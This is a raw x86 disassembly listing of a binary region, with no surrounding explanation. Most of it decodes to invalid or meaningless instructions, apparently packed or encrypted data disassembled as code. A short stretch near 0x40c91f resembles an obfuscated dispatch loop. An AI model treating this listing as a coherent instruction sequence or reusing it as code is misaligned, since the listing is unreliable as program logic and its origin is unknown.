  40c6d2:	adc    DWORD PTR [ecx+edi*8+0x6f],ebx
  40c6d6:	scas   al,BYTE PTR es:[edi]
  40c6d7:	(bad)  
  40c6d8:	ficomp WORD PTR [ebx+ebx*4]
  40c6db:	div    ecx
  40c6dd:	push   esp
  40c6de:	xchg   edx,ebp
  40c6e0:	aas    
  40c6e1:	js     0x40c755
  40c6e3:	or     ebx,ecx
  40c6e5:	sbb    dh,dh
  40c6e7:	mov    edx,0x58b2384b
  40c6ec:	and    DWORD PTR [esi],edx
  40c6ee:	inc    ebx
  40c6ef:	out    dx,al
  40c6f0:	bound  esi,QWORD PTR [eax+edx*1+0x74]
  40c6f4:	sbb    al,0x70
  40c6f6:	and    eax,0xcb5ff78b
  40c6fb:	pop    esi
  40c6fc:	cli    
  40c6fd:	mov    ?,WORD PTR [esi]
  40c6ff:	(bad)  
  40c700:	inc    edx
  40c701:	dec    esp
  40c702:	inc    edi
  40c703:	push   edx
  40c704:	push   ecx
  40c705:	fiadd  DWORD PTR [edx+0x43]
  40c708:	test   BYTE PTR [edx],bh
  40c70a:	call   0xb8bb:0xf9921b7f
  40c711:	jbe    0x40c6b0
  40c713:	std    
  40c714:	test   al,0x65
  40c716:	(bad)  
  40c717:	stos   DWORD PTR es:[edi],eax
  40c718:	or     al,0x2e
  40c71a:	inc    ecx
  40c71b:	out    0x9f,eax
  40c71d:	xor    eax,0x15689d40
  40c722:	and    DWORD PTR [eax+ebp*8+0x67],edi
  40c726:	mov    ebp,0x570dc3fd
  40c72b:	jnp    0x40c6ea
  40c72d:	inc    ecx
  40c72e:	and    eax,0x6d86e301
  40c733:	mov    ebx,0x66e017c1
  40c738:	out    dx,eax
  40c739:	jo     0x40c736
  40c73b:	mov    ecx,0x1e2a54a6
  40c740:	ss dec edi
  40c742:	xor    BYTE PTR [esi+eax*4-0x109203f2],ch
  40c749:	std    
  40c74a:	sub    DWORD PTR [esi-0x42],0x6169bbb4
  40c751:	test   al,0xfb
  40c753:	dec    eax
  40c754:	inc    edi
  40c755:	mov    ah,BYTE PTR [edx+0x30]
  40c758:	jnp    0x40c711
  40c75a:	int    0xb3
  40c75c:	imul   esi,DWORD PTR [eax+0x596b7267],0x15
  40c763:	xchg   ecx,eax
  40c764:	cmp    al,0x86
  40c766:	mov    ds:0x45e8f07d,al
  40c76b:	gs pop eax
  40c76d:	xor    DWORD PTR [esi-0x1a316285],edi
  40c773:	icebp  
  40c774:	stc    
  40c775:	mov    dh,0x84
  40c777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c778:	addr16 and eax,0xd8244aa2
  40c77e:	imul   ebp,ebp,0xffffffb8
  40c781:	inc    ecx
  40c782:	mov    eax,ds:0xb4d53800
  40c787:	cdq    
  40c788:	and    bh,BYTE PTR [edx+0x5d]
  40c78b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c78d:	repz imul eax,edi,0x66
  40c791:	mov    esi,0xb5d28b77
  40c796:	inc    ebx
  40c797:	int3   
  40c798:	dec    edi
  40c799:	(bad)  
  40c79a:	cli    
  40c79b:	adc    DWORD PTR [edi],ebp
  40c79d:	push   esp
  40c79e:	xlat   BYTE PTR ds:[ebx]
  40c79f:	outs   dx,BYTE PTR ds:[esi]
  40c7a0:	rol    BYTE PTR [edi+eiz*8-0x6d],cl
  40c7a4:	mov    cs,WORD PTR [esi-0x7d615d70]
  40c7aa:	(bad)  
  40c7ab:	rcl    bh,1
  40c7ad:	cld    
  40c7ae:	imul   ebx,DWORD PTR [ebx],0x1e
  40c7b1:	pop    ecx
  40c7b2:	das    
  40c7b3:	add    BYTE PTR [edx-0xd94a289],0x69
  40c7ba:	retf   
  40c7bb:	mov    eax,ds:0xbded234b
  40c7c0:	push   ebx
  40c7c1:	sti    
  40c7c2:	sub    BYTE PTR [edi-0x44],ch
  40c7c5:	arpl   bx,ax
  40c7c7:	repz mov ds:0xa286477e,eax
  40c7cd:	in     eax,0x3d
  40c7cf:	inc    ecx
  40c7d0:	xchg   ebx,eax
  40c7d1:	outs   dx,DWORD PTR ds:[esi]
  40c7d2:	jne    0x40c83e
  40c7d4:	inc    ebx
  40c7d5:	mov    esp,0x21000ff4
  40c7da:	inc    ebp
  40c7db:	mov    edi,0x476644b6
  40c7e0:	mov    ah,0xcf
  40c7e2:	icebp  
  40c7e3:	in     eax,dx
  40c7e4:	xchg   edx,eax
  40c7e5:	loop   0x40c804
  40c7e7:	add    dh,ch
  40c7e9:	sub    edi,DWORD PTR [ebx+edx*8+0x6f]
  40c7ed:	dec    edx
  40c7ee:	jae    0x40c796
  40c7f0:	inc    ebp
  40c7f1:	jp     0x40c7f3
  40c7f3:	pop    edx
  40c7f4:	ins    DWORD PTR es:[edi],dx
  40c7f5:	pop    es
  40c7f6:	mov    DWORD PTR [edi-0x11f6a435],edx
  40c7fc:	cwde   
  40c7fd:	xchg   esi,eax
  40c7fe:	jmp    0x40c7ff
  40c800:	mov    ecx,ebx
  40c802:	jmp    0x1f04:0xcdfa3551
  40c809:	xor    eax,0xba0b8cdb
  40c80e:	ror    DWORD PTR [ecx],1
  40c810:	aam    0xf2
  40c812:	loope  0x40c883
  40c814:	jl     0x40c7f1
  40c816:	mul    DWORD PTR [esi+0x25]
  40c819:	or     eax,0x2c0e2178
  40c81e:	add    esi,DWORD PTR [edi-0xfdab5d0]
  40c824:	mov    cl,0x2c
  40c826:	std    
  40c827:	nop
  40c828:	push   ds
  40c829:	outs   dx,BYTE PTR ds:[esi]
  40c82a:	and    al,0x14
  40c82c:	pushf  
  40c82d:	std    
  40c82e:	add    BYTE PTR [edx],ah
  40c830:	(bad)  
  40c831:	rcl    BYTE PTR [eax],1
  40c833:	loope  0x40c7c1
  40c835:	into   
  40c836:	adc    ecx,DWORD PTR [eax]
  40c838:	or     eax,0xa9a623e1
  40c83d:	std    
  40c83e:	ret    0xb7d8
  40c841:	scas   eax,DWORD PTR es:[edi]
  40c842:	or     al,0xf1
  40c844:	je     0x40c846
  40c846:	pushf  
  40c847:	xchg   edi,eax
  40c848:	aam    0x8e
  40c84a:	imul   edi,eax,0xa397539
  40c850:	in     al,dx
  40c851:	adc    al,0x4e
  40c853:	pop    ebp
  40c854:	inc    edx
  40c855:	inc    ecx
  40c856:	aad    0xfc
  40c858:	aam    0x46
  40c85a:	call   FWORD PTR [eax]
  40c85c:	add    al,0xb1
  40c85e:	sub    DWORD PTR cs:[eax-0x7d],ebp
  40c862:	out    dx,al
  40c863:	push   ebp
  40c864:	dec    ebx
  40c865:	or     al,0x44
  40c867:	push   edi
  40c868:	imul   esi,DWORD PTR [edi-0x2196911e],0xd9c81e7b
  40c872:	cmp    al,0x63
  40c874:	sub    ah,ch
  40c876:	push   0x53170cb4
  40c87b:	jge    0x40c819
  40c87d:	cdq    
  40c87e:	push   ss
  40c87f:	cmc    
  40c880:	pop    edx
  40c881:	iret   
  40c882:	inc    ecx
  40c883:	xchg   ebx,eax
  40c884:	retf   
  40c885:	call   0xcf5a:0xf2fc012c
  40c88c:	stc    
  40c88d:	(bad)  
  40c88f:	jecxz  0x40c90c
  40c891:	aaa    
  40c892:	ss jbe 0x40c912
  40c895:	mov    ecx,db1
  40c898:	cwde   
  40c899:	cmc    
  40c89a:	jne    0x40c910
  40c89c:	lahf   
  40c89d:	jo     0x40c8e2
  40c89f:	fild   WORD PTR [ecx+0x3]
  40c8a2:	in     eax,0x58
  40c8a4:	push   ss
  40c8a5:	xchg   ebp,eax
  40c8a6:	enter  0xb472,0xe9
  40c8aa:	push   0x4c42d3e
  40c8af:	sub    eax,0x24b18e61
  40c8b4:	js     0x40c8ab
  40c8b6:	or     dh,al
  40c8b8:	xchg   edi,eax
  40c8b9:	dec    edx
  40c8ba:	lods   al,BYTE PTR ds:[esi]
  40c8bb:	in     eax,dx
  40c8bc:	inc    ebp
  40c8bd:	cld    
  40c8be:	mov    edx,0xcf923c80
  40c8c3:	outs   dx,DWORD PTR ds:[esi]
  40c8c4:	pop    ecx
  40c8c5:	inc    ecx
  40c8c6:	push   DWORD PTR [edi-0x70]
  40c8c9:	out    0xa0,eax
  40c8cb:	pop    esi
  40c8cc:	stc    
  40c8cd:	pop    ecx
  40c8ce:	jmp    0x40c8f8
  40c8d0:	xchg   edx,eax
  40c8d1:	and    eax,0x9dc7649f
  40c8d6:	dec    edx
  40c8d7:	push   0x34c592e0
  40c8dc:	outs   dx,BYTE PTR ds:[esi]
  40c8dd:	lods   eax,DWORD PTR es:[esi]
  40c8df:	repz jns 0x40c8d1
  40c8e2:	in     al,dx
  40c8e3:	jle    0x40c8c7
  40c8e5:	ror    ecx,cl
  40c8e7:	sbb    eax,DWORD PTR [edi+0x13833719]
  40c8ed:	cdq    
  40c8ee:	xor    DWORD PTR [ebp+0x582b9835],ebp
  40c8f4:	mov    es,esp
  40c8f6:	loop   0x40c891
  40c8f8:	sahf   
  40c8f9:	(bad)  
  40c8fa:	sbb    DWORD PTR [edi+0x1006815e],0xbf69e669
  40c904:	mov    bh,0xa4
  40c906:	sub    esp,DWORD PTR [esi]
  40c908:	cmp    esi,eax
  40c90a:	test   eax,0x874f729b
  40c90f:	inc    edi
  40c910:	pop    ds
  40c911:	pop    ecx
  40c912:	mov    ecx,0x7bcfd9f6
  40c917:	xchg   edi,eax
  40c918:	jmp    0x558b:0xe0458bb0
  40c91f:	clc    
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x8e4c5e53
  40c96a:	jbe    0x40c983
  40c96c:	mov    ds:0x78789d32,al
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	dec    ecx
  40c976:	mov    dh,0xbb
  40c978:	bound  edi,QWORD PTR [edx+0x20]
  40c97b:	mov    esi,0x8bc83cb6
  40c980:	pop    eax
  40c981:	retf   
  40c982:	rcl    BYTE PTR [edi-0x2925477a],0x63
  40c989:	mov    fs,esi
  40c98b:	or     eax,0x7f111d44
  40c990:	dec    edi
  40c991:	sbb    al,0x3c
  40c993:	jge    0x40ca11
  40c995:	(bad)  
  40c996:	out    0x78,eax
  40c998:	cmp    BYTE PTR [esi],ch
  40c99a:	mov    ebp,0xd8a74fd9
  40c99f:	adc    BYTE PTR [ecx-0x776184fd],ch
  40c9a5:	icebp  
  40c9a6:	fiadd  DWORD PTR [esi+ebx*1+0x6678c0a8]
  40c9ad:	add    eax,0xc610f361
  40c9b2:	add    esp,edx
  40c9b4:	jl     0x40ca35
  40c9b6:	or     al,bh
  40c9b8:	sar    BYTE PTR [eax+ebx*8+0x1b81abe2],1
  40c9bf:	ds dec ebp
  40c9c1:	mov    ebp,esi
  40c9c3:	sbb    eax,0x6cc5da5a
  40c9c8:	ja     0x40ca47
  40c9ca:	xor    BYTE PTR ds:0x86bcc9b1,bl
  40c9d0:	test   eax,0x3168d561
  40c9d5:	ja     0x40c9f6
  40c9d7:	mov    ebx,0x2197cd06
  40c9dc:	mov    ch,0x71
  40c9de:	pop    eax
  40c9df:	xchg   ebp,eax
  40c9e0:	stos   BYTE PTR es:[edi],al
  40c9e1:	retf   
  40c9e2:	mov    bl,0x44
  40c9e4:	ret    
  40c9e5:	sti    
  40c9e6:	in     eax,dx
  40c9e7:	cmp    al,0xeb
  40c9e9:	jl     0x40ca4e
  40c9eb:	xchg   BYTE PTR [edi-0x687ddd0b],dh
  40c9f1:	dec    ecx
  40c9f2:	add    eax,0xcab4fca1
  40c9f7:	cmc    
  40c9f8:	cmp    edx,DWORD PTR [esi]
  40c9fa:	cdq    
  40c9fb:	(bad)  
  40c9fc:	jle    0x40c9be
  40c9fe:	mov    cl,0x1e
  40ca00:	push   0xffffffef
  40ca02:	sbb    bl,BYTE PTR [ecx]
  40ca04:	shr    bh,1
  40ca06:	cmovl  ebx,DWORD PTR [ebx+0x75]
  40ca0a:	shl    DWORD PTR [edi+0x35],0x0
  40ca0e:	in     eax,0x8b
  40ca10:	mov    ebx,DWORD PTR [ecx]
  40ca12:	pop    ebp
  40ca13:	loope  0x40c9dc
  40ca15:	push   edx
  40ca16:	cdq    
  40ca17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca18:	test   eax,0xbe870df5
  40ca1d:	rol    edi,0xd5
  40ca20:	mov    al,ds:0x6ac5f98f
  40ca25:	jns    0x40c9fd
  40ca27:	pop    ss
  40ca28:	push   ebx
  40ca2a:	jns    0x40c9ef
  40ca2c:	xor    al,0x9
  40ca2e:	mov    dl,0x35
  40ca30:	rol    DWORD PTR [edi],cl
  40ca32:	xor    BYTE PTR [ecx-0x6b],dh
  40ca35:	xchg   esi,eax
  40ca36:	xchg   edx,eax
  40ca37:	xor    eax,0xb49ac2c
  40ca3c:	add    eax,0x10279d39
  40ca41:	inc    eax
  40ca42:	icebp  
  40ca43:	bound  edi,QWORD PTR [eax+ebx*2+0x3a999c86]
  40ca4a:	int3   
  40ca4b:	cmova  ecx,DWORD PTR [ecx+0x5f8eb72b]
  40ca52:	test   eax,edi
  40ca54:	cld    
  40ca55:	jns    0x40ca08
  40ca57:	adc    DWORD PTR [ecx-0x2cb674b0],0xffffffbd
  40ca5e:	scas   al,BYTE PTR es:[edi]
  40ca5f:	cmp    esi,DWORD PTR [edi]
  40ca61:	cmp    BYTE PTR [esi+0x75],ch
  40ca64:	adc    esp,DWORD PTR [edx-0x78]
  40ca67:	add    eax,0x3e96291c
  40ca6c:	and    BYTE PTR [edi+0x44],bl
  40ca6f:	xlat   BYTE PTR ds:[ebx]
  40ca70:	leave  
  40ca71:	out    0x2e,al
  40ca73:	add    al,0xb5
  40ca75:	(bad)  
  40ca76:	pop    ss
  40ca77:	cmc    
  40ca78:	repz into 
  40ca7a:	mov    edx,0xa272b0cb
  40ca7f:	jbe    0x40ca95
  40ca81:	sahf   
  40ca82:	lock bound ebx,QWORD PTR [esi]
  40ca85:	sbb    eax,0x3eadd4d8
  40ca8a:	push   ds
  40ca8b:	jmp    0x33d16bd3
  40ca90:	test   DWORD PTR [esi+0x54],edi
  40ca93:	mov    dl,0xc6
  40ca95:	in     al,0x20
  40ca97:	sahf   
  40ca98:	ret    
  40ca99:	xchg   edx,eax
  40ca9a:	jo     0x40caa5
  40ca9c:	sbb    DWORD PTR [edx],ebp
  40ca9e:	mov    al,0xf2
  40caa0:	not    DWORD PTR [eax]
  40caa2:	mov    edi,0xf01b815
  40caa7:	xor    ebx,ebx
  40caa9:	(bad)  
  40caaa:	stos   DWORD PTR es:[edi],eax
  40caab:	xchg   BYTE PTR [esi-0x63ae8d18],ah
  40cab1:	push   edx
  40cab2:	jo     0x40ca5f
  40cab4:	cmp    bh,BYTE PTR [ecx+0x5a798034]
  40caba:	ror    bl,cl
  40cabc:	and    DWORD PTR cs:[eax+0x2daabb09],eax
  40cac3:	push   edi
  40cac4:	jmp    0x40cadc
  40cac6:	add    dl,BYTE PTR [ebx]
  40cac8:	xlat   BYTE PTR ds:[ebx]
  40cac9:	cmp    eax,0x6ff01993
  40cace:	(bad)  
  40cacf:	ror    edx,cl
  40cad1:	lods   eax,DWORD PTR ds:[esi]
  40cad2:	(bad)  
  40cad3:	jnp    0x40cb22
  40cad5:	inc    eax
  40cad6:	aad    0x30
  40cad8:	pop    ecx
  40cad9:	mov    eax,ds:0xe4a2e28b
  40cade:	sahf   
  40cadf:	xchg   edx,eax
  40cae0:	sub    DWORD PTR [ebp-0x3abe447d],0xffffffa2
  40cae7:	jmp    0x1420:0xd640e242
  40caee:	icebp  
  40caef:	fnstenv [eax+edi*8-0x36]
  40caf3:	xor    bl,BYTE PTR [ebp-0xea1e39b]
  40caf9:	imul   ebx,DWORD PTR fs:[edx-0x104dae20],0x38d98e71
  40cb04:	push   esi
  40cb05:	jo     0x40cae6
  40cb07:	jb     0x40cb05
  40cb09:	add    BYTE PTR [eax+0x52],bh
  40cb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb0e:	jo     0x40cac6
  40cb10:	es cld 
  40cb12:	mov    dl,0x16
  40cb14:	cwde   
  40cb15:	jp     0x40cb47
  40cb17:	ins    DWORD PTR es:[edi],dx
  40cb18:	jle    0x40cb0e
  40cb1a:	hlt    
  40cb1b:	out    0x29,al
  40cb1d:	repz and DWORD PTR [ebp-0x67],esi
  40cb21:	dec    edx
  40cb22:	sub    ch,BYTE PTR [ebx*2+0x6e54f625]
  40cb29:	adc    BYTE PTR [esi],ah
  40cb2b:	lods   al,BYTE PTR ds:[esi]
  40cb2c:	xor    dl,BYTE PTR [ebp+0x7b295ec1]
  40cb32:	sub    DWORD PTR [edi-0x21ee63d7],0x1e
  40cb39:	adc    bl,BYTE PTR [eax+0x77]
  40cb3c:	test   al,0x8e
  40cb3e:	dec    ebx
  40cb3f:	mov    al,0x67
  40cb41:	pop    eax
  40cb42:	neg    esp
  40cb44:	xchg   esi,eax
  40cb45:	or     dh,ah
  40cb47:	push   es
  40cb48:	mov    esi,DWORD PTR [ecx+0x2235874e]
  40cb4e:	mov    ds:0x90533fc8,eax
  40cb53:	imul   ebx,DWORD PTR [esi],0xf4d1b033
  40cb59:	inc    esi
  40cb5a:	fwait
  40cb5b:	adc    al,0x9f
  40cb5d:	xor    BYTE PTR ds:0x6313,dh
  40cb62:	sub    DWORD PTR [esp+esi*1],0xffffff8c
  40cb66:	imul   edi,DWORD PTR [eax+0x5c],0x3188886f
  40cb6d:	jmp    0x44eb:0xf64ee171
  40cb74:	test   eax,0x5633792d
  40cb79:	push   ecx
  40cb7a:	and    eax,0xfbeaf0b9
  40cb7f:	int3   
  40cb80:	jae    0x40cbae
  40cb82:	cmc    
  40cb83:	ret    
  40cb84:	mov    ds:0x85169470,al
  40cb89:	gs loop 0x40cb20
  40cb8c:	jae    0x40cb50
  40cb8e:	xchg   esp,eax
  40cb8f:	aad    0xdd
  40cb91:	mov    ah,0x6
  40cb93:	xor    al,0x41
  40cb95:	jge    0x40cb6f
  40cb97:	or     al,0xd0
  40cb99:	sbb    DWORD PTR [edi-0x33],ebx
  40cb9c:	ret    
  40cb9d:	retf   
  40cb9e:	and    eax,0x80c9ec80
  40cba3:	adc    bh,BYTE PTR [ecx]
  40cba5:	adc    bh,BYTE PTR [ecx+0x51f96ba5]
  40cbab:	xchg   esp,eax
  40cbac:	das    
  40cbad:	hlt    
  40cbae:	int3   
  40cbaf:	xor    al,0x9c
  40cbb1:	mov    cl,0x18
  40cbb3:	lahf   
  40cbb4:	ins    BYTE PTR es:[edi],dx
  40cbb5:	or     esi,eax
  40cbb7:	jne    0x40cb9a
  40cbb9:	sub    eax,0x73743b75
  40cbbe:	fs (bad) 
  40cbc0:	mov    al,ds:0xea721ba
  40cbc5:	push   es
  40cbc6:	jb     0x40cbb2
  40cbc8:	fisub  DWORD PTR [edx]
  40cbca:	jl     0x40cb95
  40cbcc:	jl     0x40cb5e
  40cbce:	sbb    DWORD PTR [esi+0x20a146d8],ebp
  40cbd4:	lahf   
  40cbd5:	or     bl,BYTE PTR [esi]
  40cbd7:	fwait
  40cbd8:	enter  0x61a6,0x1d
  40cbdc:	adc    eax,0x218519f
  40cbe1:	xor    dl,al
  40cbe3:	(bad)  
  40cbe4:	jmp    FWORD PTR [ecx-0x168ad59e]
  40cbea:	ins    DWORD PTR es:[edi],dx
  40cbeb:	push   edi
  40cbec:	mov    BYTE PTR [ecx-0x21784493],al
  40cbf2:	dec    esi
  40cbf3:	adc    DWORD PTR [ebp+0x2460bc86],edi
  40cbf9:	push   cs
  40cbfa:	jle    0x40cc58
  40cbfc:	mov    ah,0xaa
  40cbfe:	hlt    
  40cbff:	js     0x40cb9e
  40cc01:	imul   eax,edx,0x6f
  40cc04:	div    eax
  40cc06:	or     esp,esp
  40cc08:	dec    edx
  40cc09:	sbb    esp,ebp
  40cc0b:	in     al,0x49
  40cc0d:	imul   eax,DWORD PTR [esi],0x1c
  40cc10:	push   ebx
  40cc11:	jecxz  0x40cc2f
  40cc13:	cmp    ebx,DWORD PTR [edx]
  40cc15:	push   ecx
  40cc16:	push   ebx
  40cc17:	inc    ebp
  40cc18:	jns    0x40cbde
  40cc1a:	jo     0x40cbfc
  40cc1c:	hlt    
  40cc1d:	pop    ecx
  40cc1e:	(bad)  
  40cc1f:	cli    
  40cc20:	add    al,cl
  40cc22:	hlt    
  40cc23:	or     edi,DWORD PTR [esi-0x34]
  40cc26:	push   cs
  40cc27:	pushf  
  40cc28:	es push es
  40cc2a:	sbb    ebp,DWORD PTR [edx]
  40cc2c:	xor    dl,BYTE PTR ds:0xea36cd62
  40cc32:	adc    BYTE PTR [edi],0x83
  40cc35:	shl    DWORD PTR [ebx+ebx*4+0x68],1
  40cc39:	cmovne ebx,DWORD PTR [ebx]
  40cc3c:	outs   dx,DWORD PTR ds:[esi]
  40cc3d:	cmp    eax,DWORD PTR [ebx+0x7e]
  40cc40:	xchg   esp,esp
  40cc42:	dec    ebp
  40cc43:	mov    ah,0x8
  40cc45:	in     eax,dx
  40cc46:	scas   al,BYTE PTR es:[edi]
  40cc47:	ins    BYTE PTR es:[edi],dx
  40cc48:	add    eax,0x44834aa4
  40cc4d:	sub    DWORD PTR [edi+0x2f849c6c],edx
  40cc53:	scas   al,BYTE PTR es:[edi]
  40cc54:	mov    dl,0xa3
  40cc56:	add    BYTE PTR [ecx-0x7ec51cc9],ah
  40cc5c:	jno    0x40cc28
  40cc5e:	(bad)  
  40cc5f:	(bad)  
  40cc60:	sbb    bl,bl
  40cc62:	mov    ah,0x87
  40cc64:	jl     0x40cc61
  40cc66:	jae    0x40cc08
  40cc68:	push   ecx
  40cc69:	push   cs
  40cc6a:	or     al,0x29
  40cc6c:	scas   al,BYTE PTR es:[edi]
  40cc6d:	push   esp
  40cc6e:	retf   
  40cc6f:	cmpxchg BYTE PTR [ecx],bh
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0xc3
  40cc85:	ja     0x40cc15
  40cc87:	call   0x78b96eba
  40cc8c:	je     0x40cd0c
  40cc8e:	js     0x40cd08
  40cc90:	sbb    DWORD PTR [esp+edx*8+0x51cbb62e],eax
  40cc97:	xor    edi,DWORD PTR [ebx-0x1c876788]
  40cc9d:	mov    al,ds:0xcea61e48
  40cca2:	imul   esp,DWORD PTR [ebx+ecx*4-0x15],0xffffff91
  40cca7:	data16 fild QWORD PTR [ebp+0x50438b60]
  40ccae:	ds dec edi
  40ccb0:	es test dh,ch
  40ccb3:	repnz mov bh,0xb3
  40ccb6:	jb     0x40ccd8
  40ccb8:	aaa    
  40ccb9:	sahf   
  40ccba:	int    0x7e
  40ccbc:	dec    ebx
  40ccbd:	push   esp
  40ccbe:	and    al,0x93
  40ccc0:	add    edi,DWORD PTR [ebx-0x11]
  40ccc3:	je     0x40cc4f
  40ccc5:	jg     0x40cc9b
  40ccc7:	and    eax,0xa421410a
  40cccc:	fst    DWORD PTR [edi-0x34]
  40cccf:	in     al,0x5c
  40ccd1:	xor    al,BYTE PTR [ebp+0x182e3e7d]
  40ccd7:	rol    BYTE PTR [ebp+ebx*1+0x700e0ed8],cl
  40ccde:	mov    ds:0x1cb16443,al
  40cce3:	inc    esp
  40cce4:	mov    ebx,0xdcaa252c
  40cce9:	and    ebp,ecx
  40cceb:	(bad)  
  40ccec:	and    eax,0xc26878cd
  40ccf1:	cwde   
  40ccf2:	or     eax,0x54251db7
  40ccf7:	add    DWORD PTR [esi],ecx
  40ccf9:	call   0x3e0a:0x36412dfb
  40cd00:	jb     0x40cc96
  40cd02:	xchg   edi,eax
  40cd03:	iret   
  40cd04:	in     al,0x1d
  40cd06:	pusha  
  40cd07:	ss ret 0x3560
  40cd0b:	jns    0x40cd56
  40cd0d:	(bad)  
  40cd0e:	daa    
  40cd0f:	lahf   
  40cd10:	jecxz  0x40cced
  40cd12:	inc    eax
  40cd13:	push   ebx
  40cd14:	push   ebp
  40cd15:	adc    dl,bh
  40cd17:	sbb    al,0x1d
  40cd19:	xchg   DWORD PTR [esi],esp
  40cd1b:	cmc    
  40cd1c:	stc    
  40cd1d:	popf   
  40cd1e:	push   0xb1f6065d
  40cd23:	shl    DWORD PTR ds:0x67870659,1
  40cd29:	mov    WORD PTR [edi-0xd811ff],gs
  40cd2f:	cmp    al,0xc7
  40cd31:	adc    eax,0xd1bae64a
  40cd36:	push   ss
  40cd37:	mov    dh,0x2f
  40cd39:	sbb    dl,BYTE PTR [eax]
  40cd3b:	xchg   edx,eax
  40cd3c:	aas    
  40cd3d:	leave  
  40cd3e:	inc    ebx
  40cd3f:	leave  
  40cd40:	stos   BYTE PTR es:[edi],al
  40cd41:	push   ss
  40cd42:	ins    DWORD PTR es:[edi],dx
  40cd43:	repz pop ebx
  40cd45:	pop    ds
  40cd46:	pop    ss
  40cd47:	cwde   
  40cd48:	ret    0xb5de
  40cd4b:	jg     0x40cd61
  40cd4d:	and    al,0x5
  40cd4f:	shr    DWORD PTR [ebx-0x531b76bd],cl
  40cd55:	in     eax,dx
  40cd56:	into   
  40cd57:	mov    esp,0x44d819d9
  40cd5c:	mov    bh,0xdf
  40cd5e:	cmp    DWORD PTR [esi+0x70],esp
  40cd61:	inc    ebp
  40cd62:	push   es
  40cd63:	jns    0x40cd32
  40cd65:	pop    esp
  40cd66:	shl    edi,0x6
  40cd69:	mov    DWORD PTR [ecx+0x2a],edi
  40cd6c:	xchg   ebx,eax
  40cd6d:	inc    edi
  40cd6e:	push   0x62806c4f
  40cd73:	inc    eax
  40cd74:	mov    eax,0xc8e9ea90
  40cd79:	in     al,dx
  40cd7a:	cmp    al,0x44
  40cd7c:	mov    cl,0x14
  40cd7e:	fld    DWORD PTR [edi+0x46103d60]
  40cd84:	stos   DWORD PTR es:[edi],eax
  40cd85:	pop    ebx
  40cd86:	gs (bad) 
  40cd88:	sub    al,0x83
  40cd8a:	cmc    
  40cd8b:	lds    edi,FWORD PTR [eax-0xaef519f]
  40cd91:	jns    0x40cd91
  40cd93:	xchg   esi,eax
  40cd94:	ds dec ebx
  40cd96:	pop    ebp
  40cd97:	mov    DWORD PTR [ebx+edx*2+0x3da15418],0xf7c2ef2
  40cda2:	retf   0x640d
  40cda5:	sub    edx,esi
  40cda7:	mov    dh,0xb9
  40cda9:	sub    dl,BYTE PTR [ebx+esi*8]
  40cdac:	inc    edx
  40cdad:	ja     0x40ce1c
  40cdaf:	xchg   edi,eax
  40cdb0:	jmp    0x40cd51
  40cdb2:	fnstenv [ecx]
  40cdb4:	jns    0x40ce2a
  40cdb6:	cmp    BYTE PTR [edx-0x23],dl
  40cdb9:	std    
  40cdba:	mov    esi,0xbaad21d1
  40cdbf:	or     DWORD PTR [edi-0x4698f4e],edx
  40cdc5:	(bad)  
  40cdc6:	stos   BYTE PTR es:[edi],al
  40cdc7:	(bad)  
  40cdc8:	loop   0x40ce10
  40cdca:	hlt    
  40cdcb:	dec    eax
  40cdcc:	mov    bl,0xec
  40cdce:	leave  
  40cdcf:	push   DWORD PTR [edi-0x1e]
  40cdd2:	mov    bh,0x9e
  40cdd4:	mov    dh,BYTE PTR [ecx-0x1db0c4f2]
  40cdda:	(bad)  
  40cddb:	test   BYTE PTR [ebx+0x0],0xf2
  40cddf:	adc    eax,0xd8df5efe
  40cde4:	and    BYTE PTR [edx],0x4c
  40cde7:	jecxz  0x40cdf9
  40cde9:	and    BYTE PTR [ebx],dh
  40cdeb:	and    eax,0x51fd5939
  40cdf0:	pop    edx
  40cdf1:	jmp    0x40cd9b
  40cdf3:	cld    
  40cdf4:	pop    ecx
  40cdf5:	ss ss out 0x53,eax
  40cdf9:	ror    BYTE PTR [ebx],cl
  40cdfb:	lds    ebx,FWORD PTR [edx+0x68f57ce8]
  40ce01:	push   esi
  40ce02:	shufps xmm1,xmm2,0xa9
  40ce06:	inc    eax
  40ce07:	in     al,0xeb
  40ce09:	cli    
  40ce0a:	(bad)  
  40ce0b:	ins    DWORD PTR es:[edi],dx
  40ce0c:	pop    ds
  40ce0d:	pop    ss
  40ce0e:	out    dx,eax
  40ce0f:	mov    eax,ds:0xbe7f871f
  40ce14:	jo     0x40cdd0
  40ce16:	xchg   dl,bl
  40ce18:	xchg   ebx,eax
  40ce19:	and    eax,ebx
  40ce1b:	daa    
  40ce1c:	cmp    al,0xc1
  40ce1e:	xchg   ebx,eax
  40ce1f:	xchg   edi,eax
  40ce20:	pusha  
  40ce21:	in     al,dx
  40ce22:	mov    esi,0x2662f681
  40ce27:	cmp    edi,DWORD PTR [esi-0x28]
  40ce2a:	aaa    
  40ce2b:	dec    ebp
  40ce2c:	sar    BYTE PTR [eax-0x3a],1
  40ce2f:	outs   dx,DWORD PTR ds:[esi]
  40ce30:	ret    0x541f
